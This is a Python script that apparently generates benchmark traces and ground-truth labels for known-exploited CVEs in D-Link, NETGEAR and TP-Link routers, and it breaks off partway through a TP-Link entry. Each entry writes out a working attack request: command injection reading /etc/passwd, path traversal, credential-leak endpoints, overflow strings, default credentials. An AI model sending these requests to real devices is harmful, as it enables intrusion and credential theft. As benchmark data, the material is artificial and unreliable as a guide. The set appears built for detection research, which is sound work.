#!/usr/bin/env python3
"""Generate trace JSONs and ground_truth entries for CISA KEV CVEs."""
import json
import os

TRACE_DIR = os.path.join(os.path.dirname(__file__), "..", "benchmarks", "traces")
GT_PATH = os.path.join(os.path.dirname(__file__), "..", "benchmarks", "ground_truth.json")

TRACES = [
    # ===== D-Link (23) =====
    {
        "cve_id": "CVE-2015-2051",
        "vendor": "D-Link",
        "product": "DIR-645",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/HNAP1/",
                "params": {},
                "headers": {
                    "Content-Type": "text/xml",
                    "SOAPAction": "http://purenetworks.com/HNAP1/`cat /etc/passwd`"
                },
                "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"></AddPortMapping></soap:Body></soap:Envelope>"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "SOAPAction",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/37171",
            "reasoning": "HNAP SOAPAction header value is passed to system() without sanitization. Backtick-delimited command in SOAPAction header triggers RCE."
        }
    },
    {
        "cve_id": "CVE-2016-11021",
        "vendor": "D-Link",
        "product": "DCS-930L",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/setSystemCommand",
                "params": {"ReplySuccessPage": "success.htm", "ReplyErrorPage": "error.htm", "SystemCommand": "cat /etc/passwd", "ConfigSystemCommand": "Save"},
                "headers": {"Authorization": "Basic YWRtaW46"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "SystemCommand",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/40936",
            "reasoning": "SystemCommand parameter passed directly to system(). Requires basic auth (default admin:empty)."
        }
    },
    {
        "cve_id": "CVE-2016-20017",
        "vendor": "D-Link",
        "product": "DSL-2750B",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/login.cgi",
                "params": {"cli": "aa aa';cat /etc/passwd'"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "cli",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/44760",
            "reasoning": "cli parameter in login.cgi passed to shell without sanitization. Single-quote delimiter for command injection."
        }
    },
    {
        "cve_id": "CVE-2018-6530",
        "vendor": "D-Link",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/soap.cgi",
                "params": {},
                "headers": {
                    "Content-Type": "text/xml",
                    "SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers"
                },
                "body": "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>`cat /etc/passwd`</NewNTPServer1></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "NewNTPServer1",
            "payload_encoding": "none",
            "payload_extraction": "xml_body",
            "source": "https://www.exploit-db.com/exploits/44576",
            "reasoning": "UPnP SOAP service SetNTPServers action passes NewNTPServer1 to shell. Affects DIR-860L, DIR-865L, DIR-868L, DIR-880L."
        }
    },
    {
        "cve_id": "CVE-2019-16057",
        "vendor": "D-Link",
        "product": "DNS-320",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/login_mgr.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "port=443&username=admin%27%3Bcat%20/etc/passwd%3B%27&password=test"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "username",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/47407",
            "reasoning": "login_mgr.cgi passes username to shell via sprintf+system. Single-quote break + semicolon command injection."
        }
    },
    {
        "cve_id": "CVE-2019-16920",
        "vendor": "D-Link",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/apply_sec.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=ping_test&ping_ipaddr=127.0.0.1;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ping_ipaddr",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/47440",
            "reasoning": "apply_sec.cgi ping_test action passes ping_ipaddr to shell. Pre-auth on DIR-655, DIR-866, DIR-652, DHP-1565. Requires login_name=YWRtaW4= (base64 admin)."
        }
    },
    {
        "cve_id": "CVE-2019-20500",
        "vendor": "D-Link",
        "product": "DWL-2600AP",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/admin/admin.shtml",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "configBackup=1&configRestore=1&configServerip=;cat /etc/passwd;&configPath=/"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "configServerip",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-20500",
            "reasoning": "configBackup functionality passes configServerip to shell without sanitization. Requires admin authentication."
        }
    },
    {
        "cve_id": "CVE-2020-25078",
        "vendor": "D-Link",
        "product": "DCS-2530L",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/config/getuser",
                "params": {"index": "0"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "name=admin&pass=admin123&privilege=0"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-25078",
            "reasoning": "Unauthenticated access to /config/getuser leaks admin credentials in plaintext. Affects DCS-2530L and DCS-2670L."
        }
    },
    {
        "cve_id": "CVE-2020-25079",
        "vendor": "D-Link",
        "product": "DCS-2530L",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/ddns_enc.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46YWRtaW4="},
                "body": "hostname=test;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "hostname",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-25079",
            "reasoning": "ddns_enc.cgi passes hostname parameter to shell. Requires authentication. Affects DCS-2530L and DCS-2670L."
        }
    },
    {
        "cve_id": "CVE-2020-25506",
        "vendor": "D-Link",
        "product": "DNS-320",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/system_mgr.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "C1=ON&cmd=cgi_sms_test&sms1=cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "sms1",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/48956",
            "reasoning": "system_mgr.cgi cgi_sms_test command passes sms1 to shell for SMS testing. No auth required. Exploit-DB 48956."
        }
    },
    {
        "cve_id": "CVE-2020-29557",
        "vendor": "D-Link",
        "product": "DIR-825 R1",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/HNAP1/",
                "params": {},
                "headers": {
                    "Content-Type": "text/xml",
                    "SOAPAction": "http://purenetworks.com/HNAP1/`cat /etc/passwd`"
                },
                "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>request</Action><Username>admin</Username></Login></soap:Body></soap:Envelope>"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "SOAPAction",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-29557",
            "reasoning": "Same HNAP SOAPAction injection pattern as CVE-2015-2051. DIR-825 R1 firmware v2.x."
        }
    },
    {
        "cve_id": "CVE-2020-9377",
        "vendor": "D-Link",
        "product": "DIR-610",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/webproc",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "getpage=html/index.html&var:page=deviceinfo&var:menu=setup&errorpage=html/main.html&obj-action=set&var:sys_cmd=cat /etc/passwd&var:setoper=1&var:errorpageflag=1"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "sys_cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-9377",
            "reasoning": "webproc cgi passes var:sys_cmd to system shell. Requires authentication. DIR-610 firmware 2.02."
        }
    },
    {
        "cve_id": "CVE-2021-40655",
        "vendor": "D-Link",
        "product": "DIR-605",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/getcfg.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "SERVICES=DEVICE.ACCOUNT"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?><postxml><module><service>DEVICE.ACCOUNT</service><device><account><seqno>1</seqno><max>1</max><count>1</count><entry><name>admin</name><password>admin</password><group>0</group><description></description></entry></account></device></module></postxml>"
            }
        },
        "ground_truth": {
            "sink_param": "SERVICES",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://github.com/advisories/GHSA-whph-446g-6qxr",
            "reasoning": "getcfg.php with SERVICES=DEVICE.ACCOUNT leaks admin credentials. No authentication required. DIR-605L."
        }
    },
    {
        "cve_id": "CVE-2021-45382",
        "vendor": "D-Link",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/HNAP1/",
                "params": {},
                "headers": {
                    "Content-Type": "text/xml",
                    "SOAPAction": "http://purenetworks.com/HNAP1/SetVirtualServerSettings"
                },
                "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><SetVirtualServerSettings xmlns=\"http://purenetworks.com/HNAP1/\"><VirtualServerList><VirtualServer><Enabled>true</Enabled><ExternalPort>`cat /etc/passwd`</ExternalPort></VirtualServer></VirtualServerList></SetVirtualServerSettings></soap:Body></soap:Envelope>"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ExternalPort",
            "payload_encoding": "none",
            "payload_extraction": "xml_body",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-45382",
            "reasoning": "DDNS/VirtualServer HNAP actions pass parameters to shell. Affects DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, DIR-836L."
        }
    },
    {
        "cve_id": "CVE-2022-26258",
        "vendor": "D-Link",
        "product": "DIR-820L",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/hedwig.cgi",
                "params": {},
                "headers": {"Content-Type": "text/xml", "Cookie": "uid=1234"},
                "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><postxml><module><service>DEVICE.TIME</service><device><time><ntp><enable>1</enable><server>`cat /etc/passwd`</server></ntp></time></device></module></postxml>"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "server",
            "payload_encoding": "none",
            "payload_extraction": "xml_body",
            "source": "https://github.com/advisories/GHSA-3wpq-fgjg-fcp2",
            "reasoning": "hedwig.cgi processes XML device config and passes NTP server value to shell. DIR-820L firmware v1.x."
        }
    },
    {
        "cve_id": "CVE-2023-25280",
        "vendor": "D-Link",
        "product": "DIR-820",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ping.ccp",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "ccp_act=ping_v4&ping_addr=127.0.0.1;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ping_addr",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-25280",
            "reasoning": "ping.ccp passes ping_addr to system() for ping functionality. Semicolon-delimited injection. DIR-820LA1_FW105B03."
        }
    },
    {
        "cve_id": "CVE-2024-0769",
        "vendor": "D-Link",
        "product": "DIR-859",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/hedwig.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "uid=1234"},
                "body": "service=../../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?><device><account><entry><name>admin</name><password>admin</password></entry></account></device>"
            }
        },
        "ground_truth": {
            "sink_param": "service",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-0769",
            "reasoning": "hedwig.cgi service parameter allows path traversal to read config files including DEVICE.ACCOUNT with credentials. DIR-859 all firmware."
        }
    },
    {
        "cve_id": "CVE-2025-29635",
        "vendor": "D-Link",
        "product": "DIR-823X",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/goform/set_prohibiting",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "op=add&mac=aa:bb:cc:dd:ee:ff&enable=1&name=test;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "name",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-29635",
            "reasoning": "set_prohibiting goform passes name parameter to shell for device access control. DIR-823X EoL."
        }
    },
    {
        "cve_id": "CVE-2011-4723",
        "vendor": "D-Link",
        "product": "DIR-300",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/model/__show_info.php",
                "params": {"ESSION_ID": ""},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "password = \"admin\""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2011-4723",
            "reasoning": "DIR-300 router stores admin password in plaintext, accessible without authentication via web interface information disclosure."
        }
    },
    {
        "cve_id": "CVE-2013-5223",
        "vendor": "D-Link",
        "product": "DSL-2760U",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/Forms/dns_1",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "hostname=<script>alert(1)</script>&domain=test.com"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<script>alert(1)</script>"
            }
        },
        "ground_truth": {
            "sink_param": "hostname",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2013-5223",
            "reasoning": "Stored XSS via hostname parameter in DNS configuration page. DSL-2760U gateway."
        }
    },
    {
        "cve_id": "CVE-2014-100005",
        "vendor": "D-Link",
        "product": "DIR-600",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/apply.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "html_response_page=login_pic.asp&action=do_graph_auth&login_name=YWRtaW4%3D&login_pass=YWRtaW4%3D"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "OK"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2014-100005",
            "reasoning": "CSRF vulnerability - no anti-CSRF tokens. Attacker can change admin password or router settings via crafted POST to apply.cgi."
        }
    },
    {
        "cve_id": "CVE-2022-37055",
        "vendor": "D-Link",
        "product": "Multiple Routers",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/HNAP1/",
                "params": {},
                "headers": {
                    "Content-Type": "text/xml",
                    "SOAPAction": "http://purenetworks.com/HNAP1/SetWanSettings"
                },
                "body": "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><SetWanSettings xmlns=\"http://purenetworks.com/HNAP1/\"><Type>AAAA" + "A" * 4096 + "</Type></SetWanSettings></soap:Body></soap:Envelope>"
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "Type",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-37055",
            "reasoning": "Stack-based buffer overflow in HNAP SetWanSettings via overly long Type parameter. DIR-823G."
        }
    },
    {
        "cve_id": "CVE-2022-40799",
        "vendor": "D-Link",
        "product": "DNR-322L",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/firmware_upgrade.cgi",
                "params": {},
                "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary", "Authorization": "Basic YWRtaW46YWRtaW4="},
                "body": "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"firmware.bin\"\r\nContent-Type: application/octet-stream\r\n\r\nMALICIOUS_FIRMWARE_DATA\r\n------WebKitFormBoundary--"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "Upload successful"
            }
        },
        "ground_truth": {
            "sink_param": "file",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-40799",
            "reasoning": "Arbitrary file upload via firmware upgrade endpoint. No integrity verification on uploaded firmware. DNR-322L."
        }
    },
    # ===== D-Link + TRENDnet (1) =====
    {
        "cve_id": "CVE-2015-1187",
        "vendor": "D-Link",
        "product": "Multiple Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/apply.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=127.0.0.1;cat /etc/passwd&ping_size=&ping_times=5"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "ping_ip",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2015-1187",
            "reasoning": "apply.cgi ping diagnostic passes ping_ip to shell. No CSRF protection. Affects DIR-636L, TRENDnet TEW-731BR."
        }
    },
    # ===== NETGEAR (8) =====
    {
        "cve_id": "CVE-2016-10174",
        "vendor": "NETGEAR",
        "product": "WNR2000v5",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/apply.cgi?/lang_check.html",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "submit_flag=select_language&hidden_lang_498=" + "A" * 500 + "&submit_button=Apply"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "hidden_lang_498",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/41719",
            "reasoning": "Buffer overflow in language selection leads to RCE. hidden_lang_498 overflows stack buffer. WNR2000v5."
        }
    },
    {
        "cve_id": "CVE-2016-1555",
        "vendor": "NETGEAR",
        "product": "Multiple WAP Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/boardDataWW.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "macAddress=112233445566;cat /etc/passwd&reginfo=1&writeData=Submit"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "macAddress",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/45909",
            "reasoning": "boardDataWW.php passes macAddress to shell. No auth required. Affects WN604, WNAP210v2, WNAP320, WNDAP350, WNDAP360, WNDAP660."
        }
    },
    {
        "cve_id": "CVE-2016-6277",
        "vendor": "NETGEAR",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/;cat /etc/passwd",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/40889",
            "reasoning": "cgi-bin handler passes URL path to shell. No parameter - command injected directly in URL path after /cgi-bin/;. Affects R6250, R6400, R6700, R7000, R7100LG, R7300, R7900, R8000."
        }
    },
    {
        "cve_id": "CVE-2017-5521",
        "vendor": "NETGEAR",
        "product": "Multiple Devices",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/passwordrecovered.cgi",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "admin\nadmin123"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/41205",
            "reasoning": "passwordrecovered.cgi returns admin credentials in plaintext without authentication. Affects 30+ NETGEAR models."
        }
    },
    {
        "cve_id": "CVE-2017-6077",
        "vendor": "NETGEAR",
        "product": "DGN2200",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/ping.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},
                "body": "IPAddr1=12&IPAddr2=12&IPAddr3=12&IPAddr4=12;cat /etc/passwd&ping=Ping&ping_IPAddr=12.12.12.12"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "IPAddr4",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/41459",
            "reasoning": "ping.cgi passes IPAddr fields to shell for ping. Semicolon injection in IPAddr4. DGN2200 wireless router."
        }
    },
    {
        "cve_id": "CVE-2017-6334",
        "vendor": "NETGEAR",
        "product": "DGN2200",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/dnslookup.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},
                "body": "host_name=test;cat /etc/passwd&lookup=Lookup"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "host_name",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/41394",
            "reasoning": "dnslookup.cgi passes host_name to shell for nslookup. Requires auth. DGN2200 firmware."
        }
    },
    {
        "cve_id": "CVE-2017-6862",
        "vendor": "NETGEAR",
        "product": "Multiple Devices",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/setWLanACLSettings",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "DeviceName=" + "A" * 500
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "DeviceName",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2017-6862",
            "reasoning": "Buffer overflow in setWLanACLSettings via DeviceName parameter. No auth required. Affects WNR2000v3, WNR2000v4, WNR2000v5."
        }
    },
    {
        "cve_id": "CVE-2020-26919",
        "vendor": "NETGEAR",
        "product": "JGS516PE",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/login.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "password=admin"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "OK"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-26919",
            "reasoning": "Web management interface lacks proper access controls. Internal management functions accessible without authentication. JGS516PE switch."
        }
    },
    # ===== TP-Link (6) =====
    {
        "cve_id": "CVE-2015-3035",
        "vendor": "TP-Link",
        "product": "Multiple Archer Devices",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/login/../../../etc/passwd",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2015-3035",
            "reasoning": "Path traversal in TP-Link HTTP server. Prepend /login/ to bypass auth check, then traverse to read arbitrary files."
        }
    },
    {
        "cve_id": "CVE-2020-24363",
        "vendor": "TP-Link",
        "product": "TL-WA855RE",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/data/config.json",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"admin\":{\"name\":\"admin\",\"pwd\":\"admin\"}}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-24363",
            "reasoning": "Configuration file accessible without authentication exposes admin credentials. TL-WA855RE range extender."
        }
    },
    {
        "cve_id": "CVE-2023-1389",
        "vendor": "TP-Link",
        "product": "Archer AX21",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/luci/;stok=/locale",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "form=country&operation=write&country=$(cat /etc/passwd)"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"success\":true}"
            }
        },
        "ground_truth": {
